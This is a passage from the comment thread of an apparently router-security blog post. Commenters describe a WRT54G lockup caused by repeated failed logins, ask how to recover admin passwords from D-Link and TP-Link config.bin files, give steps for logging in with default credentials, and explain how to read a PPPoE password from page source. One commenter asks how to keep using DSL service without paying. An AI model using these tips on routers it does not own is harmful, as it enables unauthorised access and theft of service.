+Pretty lame TBH. lol.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pagvac"><span>pagvac</span><div class="post-comment-content">@holddigga: this is what I like to call a "A-to-C" attack, which is more common in home routers than people think: https://www.gnucitizen.org/blog/holes-in-embedded-devices-authentication-bypass-pt-2/
+
+@Rob: could you provide more info please? i.e.: complete HTTP request and response</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Tom"><span>Tom</span><div class="post-comment-content">Has anyone tried hacking a Actiontec DSL router?</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="SM177Y"><span>SM177Y</span><div class="post-comment-content">router:WRT54G
+firmware:v8.00.2
+
+First off, I would like to confirm on the router using an IP for further authentication, after it has already been logged into using the correct user/pass. I would also like to state that this same issue is present even in remote management of the router using either http or https. You would need the correct management port but that would be quite easy with a default of 80 or 8080 or even a simple port scan could tell you which port it is using for remote management.  
+
+And now to the (if you can call it that) exploit that I found with this router.  It seems (at least for me) that with enough random*see note* access attempts to the router remotely will cause it to not respond for quite sometime, (this feat can also be obtained from behind the router) sometimes even rendering it useless until a reset. Sometimes it will release the dhcp from the modem, some times it will cause just a short nonresponsive state (1-15mins) where nothing from the outside can get a response and when the dhcp releases it causes clients connected to the router to not be able to access the internet. Although a simple reset will fix the issue most times, other times you need to fully reset the modem and the router and allow them to re-sync with each other. 
+
+Not as useful as the other exploits on the wrt54g stated earlier, but it could possibly be used for a DoS I suppose. On that note, the earlier stated exploits using curl to modify config files doesn't seem to work on my router. I think linksys may have fixed those issues with a new firmware as my firmware is a lot newer than  the one stated above.
+
+**NOTE**
+By 'random', I mean multiple access attempts that fail. I happened to notice this when attempting some pen-testing of my own on my home network. After some random connection attempts ex:ftp, remote management of the router with wrong user/pass, ssh, telnet, rdesktop, etc. You need to just give the router a bunch of useless information that it cannot seem to process or is attempting to block and eventually it will just freak out and do all sorts of odd things. Especially when attempting connections to services that do exist and are forwarded properly but with the wrong ports specified.
+
+Well I guess that's all for now. I will be sure to post anything more that I find.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Rohit"><span>Rohit</span><div class="post-comment-content">hey guys , im a total noob in this feild and i really cant understand what u guys are talkin .. but yea what  i know is i have a zyxel p-600 series modem and i really wanna tweak the speed an get some real time amazing download speed, if it is possible please please please be kind enuff to help me out on thiss.. i will really appreciate it..cheers n peace.. im from INDIA...</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="ysuf"><span>ysuf</span><div class="post-comment-content">Hey i'm ysuf from indonesia. Has anyone tried to hacking routerboard wireless mikrotik AH433. thanks guys</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pandahuge"><span>pandahuge</span><div class="post-comment-content">hi guys. been reading and it's fun knowing their weakness of some routers. the router default username and password couldn't find it. i'd like the wifi to be working. anyways i just like to ask whats the best way to know the username and password of taiwan router. no brand but i got some info about this router 
+
+http://www.alibaba.com/product-free/10159637/Wireless_4_Port_Cable_DSL_Router.html
+
+
+right know trying to do the sniffing. hope it works. 
+feel free to tell me what i can do with it.
+thanks for reading and for the help
+pandahuge</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Squeeze"><span>Squeeze</span><div class="post-comment-content">hi, i'm a newbie
+
+i've been reading this blog with attention (altough i'm not able to understand everything). i got a problem: i downloaded the "config.bin" file from a D-Link DI-524 router, but i'm not able to read it... i guess this DI-524 ".bin" file is a kinda "compressed .xml" file...
+
+Anybody can help me (i need to retrieve admin  pwd from this cnfig.bin)</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Squeeze"><span>Squeeze</span><div class="post-comment-content">Kender, can you help me?
+
+i add some infos, if useful: i tried to open it with text/hex editor, but all i can see is mostly "FF" and other unreadeble characters throughout. The only readable characters are "â€œDLB6031" (at the beginning) and "Li" (at the end)... thanks in advance for any hits/suggestions!
+
+Mark</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Kender"><span>Kender</span><div class="post-comment-content">I'm sorry. I just don't have the time to download the firmware for that device and reverse engineer it to figure out how it loads that config.bin. You're probably better off just resetting the router to it's default (blank) password: http://technicallyeasy.net/2008/02/how-to-reset-d-link-di-524-wireless/</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Squeeze"><span>Squeeze</span><div class="post-comment-content">here's a sample config.bin (if needed) http://rapidshare.com/files/239091625/DI-524_config.bin.html</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Squeeze"><span>Squeeze</span><div class="post-comment-content">hi, it's me again...
+
+i really need to find the way to read the config.bin cuz i need to retrieve the pwd, which i forgot since i've been using another router for a long time.: i just cannot reset to factory defualt, since i can't remember the configuration i set and, at the meantime, i also need to change some settings according to my new provider!...both can be done ONLY with admin pwd!
+
+i'm quite sure that the whole file (config.bin) is encrypted but i got no idea how to decode it. please help!</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Squeeze"><span>Squeeze</span><div class="post-comment-content">Hi Kender, i read just now your answer... PLEASE don't leave this way!!! take your time, i can wait a while but please help me find the way to read the config, it's important to me! Let me know, when you can. Thanks!
+
+PS: 
+the Firmware version is V2.04</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="shumackers"><span>shumackers</span><div class="post-comment-content">is there's any chance that i can used my DSL even my DSL service turn "to Off service".. i mean I didn't pay my last 5 months bill due on some personal reasons, is there's any other way that i can used or continue my service to my present DSL subscriber w/ tracing my IP... if possible maybe you can help me.. Thanks</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Squeeze"><span>Squeeze</span><div class="post-comment-content">about the effort to decode a D-Llink DI-524 config.bin: this is the Firmware version that matters http://tsd.dlink.com.tw/ModelDocuView.asp?SourceType=download&ModelSno=IJALDNNO&DocuSno=BDKDGDAD
+
+i rely on your help!
+THANKS A LOT</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Squeeze"><span>Squeeze</span><div class="post-comment-content">@ Kender
+here other Firmware links, if needed:
+
+ftp://ftp.dlink.de/di/di-524/driver_software/
+
+and
+
+ftp://ftp.dlink.co.uk/di_broadband_gateways/di-524/
+
+i do hope you will have the time to help me (it's important to me)
+thanks</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Squeeze"><span>Squeeze</span><div class="post-comment-content">Kender,
+
+when you think you have time to reverse engineer a config file, 
+please let me know and i'll send you a right config.bin to analyze.
+
+THANK YOU</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Squeeze"><span>Squeeze</span><div class="post-comment-content">please, anybody can help with reversing ? Kender, please don't leave high and dry...</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Squeeze"><span>Squeeze</span><div class="post-comment-content">meanwhile i've been trying all i could... also this software (it says it can read/edit/save config.bin files): http://docsis.sourceforge.net/
+
+i actually got no error message opening my config.bin, but the output is not undestandable to me ...does it say anything to you:
+
+<pre><code>Main
+{
+    GenericTLV TlvCode 68 TlvLength 76 TlvValue 0x423630333100070c010000000000010003000000000000400000032008de0000040132aa00ffc0
+a89618ffffff000000000000000000ff7fffffefa7ffffffffffffffffffffffffffffffff;
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    GenericTLV TlvCode 252 TlvLength 254 TlvValue 0xfffffffffffffffffffffffffffffffffffffffffffff7fbfff8f1ffffffffffffffffffffffdf
+5b3d93c7e7f3fffffffffffffffffffffffffffffffffffffffffffffffffff7fbff1cfcfffffffff
+fffffffffffffb7f355dfdbedfffffffffffffffffffffffffffffffffffffffffffffffffffff7fb
+fff7a2ffffffffffffffffffffff97b363dfdce7f2f9fcfeffff7f7f5ffffffffffffffffffffffff
+ffffffffffff7fbffeae8ffffffffffffffffffffff7ff3a58bc8f4f5f9fcfeffffffffffffffffff
+fffffffffffffffffffffffffff7fbffd5feffffffffffffffffffffff772b2d9ccaf7f5f9fcfefff
+fffffffffffffffffffffffff;
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    GenericTLV TlvCode 191 TlvLength 255 TlvValue 0xdfa7a7e903fbe7fef7fcfeffff7fff1f5f8797a1a9d0d8f4fcfffeffffffffffffffffffffffff
+fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+fffffffffffffffffffffffffff;
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /* Pad */
+    /* Pad */
+    /* Pad */
+    /* Pad */
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    DocsisTwoEnable 63;
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    GenericTLV TlvCode 141 TlvLength 53 TlvValue 0x276faf9ffffffffffefcf9f5ffe5ff95ffffffffbf7ffffffdffffffffffffffffffffffff7fff
+fffefdfdf1e6c48d35b3ff3fdfbf;
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+    GenericTLV TlvCode 137 TlvLength 191 TlvValue 0xfffbc7bfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;
+    /*EndOfDataMkr*/
+    /*EndOfDataMkr*/
+}</code></pre></div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Kevin"><span>Kevin</span><div class="post-comment-content">hi, i was wondering if there is any way of hacking and retrieving a password from my D-Link dir 655.
+
+PS. im a newbie when it comes to electronics so if you have any instructions for me, please make it simple. thx. :)</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Pritush"><span>Pritush</span><div class="post-comment-content">Is there any hack for TP Link routers ?</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Ender"><span>Ender</span><div class="post-comment-content">Is it possible to decode a TP-LINK TL-WR542G config.bin file to recover the admin password, wireless password and pppoe password because if I reset it I loose all settings and if I reload the fies the admin ppassword is also loaded</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Andy"><span>Andy</span><div class="post-comment-content">any luck with "TP-LINK Wireless Router WR541G/542G" router hacking?please let me know if is there a way doing it~~ thank~</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Nek"><span>Nek</span><div class="post-comment-content">Hello, good day, does any know how to get the password of linksys router WRT300N V1.1 with out doing hard rest, hope im not bothering you guys. have a great day :)</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Ace Winget"><span>Ace Winget</span><div class="post-comment-content">What do you mean by hack? 3rd party software or something more invasive?</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="kihara"><span>kihara</span><div class="post-comment-content">can anyone tell me how to recover a lost password of a 2600 series cisco router.i cant physically access it i have to access it remotely via telnet and http and i lost the login and the passwords.any help will be appreciated</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Dart3rocks"><span>Dart3rocks</span><div class="post-comment-content">Here is the easiest way works with your router if not insanely secure. EDUCATIONAL ONLY
+
+1) Cmd(Command Prompt)
+2) Ipconfig 
+3) Find default gateway ip (REMEMBER IP)
+4) verify with tracert (insert IP here)
+5) Type in IP into web browser (this will usually give you the router type if you don't know it already)
+6) Find default router passwords by searching for default router passwords on Google (The 1st or second site is the one you will need)
+7) Select Router type and then click find and it will give you a list
+8) Once you find the default pass go back to the IP login screen and try them 
+9) You Should Be In!
+10) Have fun, this is for educational purposes only DO NOT TRY IT ON A NEIGHBOR'S ROUTER!</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Ethical Hacking Forum"><span>Ethical Hacking Forum</span><div class="post-comment-content">Computer hacking is most common among teenagers and young adults, although there are many older hackers as well. Many hackers are true technology buffs who enjoy learning more about how computers work and consider computer hacking an "art" form.
+
+Read more: http://www.articlesbase.com/security-articles/compute-hacking-a-real-life-application-of-their-problem-solving-skills-3420032.html#ixzz13WfTXoar
+
+Under Creative Commons License: Attribution</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="sos"><span>sos</span><div class="post-comment-content">hi guys, 
+well av read all your comments, and av learned many cool stuff here :)  so i should share my knowledge with my friends... to hack the pppoe of you router, 
+
+&gt; you should login, 
+&gt; after that just began a new configuration for the router (as you have done the first time you have buy it)
+&gt; then follow all the steps without changing any thing (because the router is already configured) and when you reach the page where you enter the USER NAME and the password provided by your ISP, you will see your USER name as characters (some thing like your first-name) but your pass will be encrypted, 
+&gt; copy your user name we will need it later.
+&gt; get the source page from Mozilla firefox by pressing CTRL+U and then press CTRL+F and past you user name in the search field, press next and you will find your user name somewhere in the page (PPPusername:value:xxxx), just follow the line and you will find some thing like (PPPpassword:value:xxxxx) well done, you get it :D
+
+this link take you to youtube, and the video explain better       
+
+//www.youtube.com/watch?v=DBT2Ngspx8Q</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="instructor"><span>instructor</span><div class="post-comment-content">hi,
+
+having a problem with some idiot in my LAN who insert the LAN cable into his router's LAN port instead of WAN. this router generates its own ips from 192.168.1.xx and we cant access internet. all the other users suffer because of this stupid fellow. my network has acl bindings so it is not effecting the main provider and so they can't catch the culprit, infact it is difficult for them to catch 1 person among 2500 users. i can access to admin's page it asks for username/password. its a tplink router. is there a way to get into this router and disable dhcp services remotely ?</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="zwitter"><span>zwitter</span><div class="post-comment-content">Alright im inside the router, what more can i do now? It's a Beetle 220BX</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="zwitter"><span>zwitter</span><div class="post-comment-content">So i cracked a Beetle 220BX(and it was really easy) what more can i do now?</div></div></div></div></article><footer id="footer"><p>Copyright &copy; 2019 <a href=""></a>. All rights reserved.</p></footer></body></html>
